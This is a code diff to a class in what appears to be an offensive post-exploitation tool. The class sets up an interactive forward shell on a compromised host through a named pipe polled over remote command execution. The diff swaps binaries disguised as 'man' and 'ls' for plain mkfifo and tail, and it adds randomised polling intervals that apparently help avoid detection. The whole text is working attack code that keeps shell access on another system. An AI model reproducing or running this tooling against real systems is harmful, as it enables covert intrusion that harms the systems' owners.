@@ -1,6 +1,7 @@
 # Built-in imports
 import threading
 import time
+import random
 
 # Local application/library specific imports
 from toboggan.core.action import NamedPipe
@@ -21,19 +22,12 @@ class FifoAction(NamedPipe):
         self.tty = False
 
     def setup(self):
-        altered_mknod = self._executor.os_helper.create_alterated_copy_of(
-            "mknod", copy_name="man"
-        )
-        self._executor.remote_execute(f"{altered_mknod} {self._stdin} p")
+        self._executor.remote_execute(f"/bin/mkfifo {self._stdin}")
 
-        altered_tail = self._executor.os_helper.create_alterated_copy_of(
-            "tail", copy_name="ls"
-        )
-
-        altrered_shell = self._executor.os_helper.shell_path
+        shell = "$(ps -p $$ -o comm=)"
 
         self._executor.remote_execute(
-            f"{altered_tail} -f {self._stdin}|{altrered_shell} > {self._stdout} 2>&1 &"
+            f"/bin/tail -f {self._stdin}|{shell} > {self._stdout} 2>&1 &"
         )
 
         # Initialize stop flag
@@ -60,10 +54,10 @@ class FifoAction(NamedPipe):
 
         while not self.__stop_thread:
 
-            time.sleep(self._read_interval)
+            time.sleep(random.uniform(self._read_interval, self._read_interval * 1.5))
 
             if command_output := self._executor.remote_execute(
-                f"cat {self._stdout} && true > {self._stdout}",
+                f"/usr/bin/sed -n p {self._stdout}; : > {self._stdout}",
                 debug=False,
             ):
                 if self.tty:
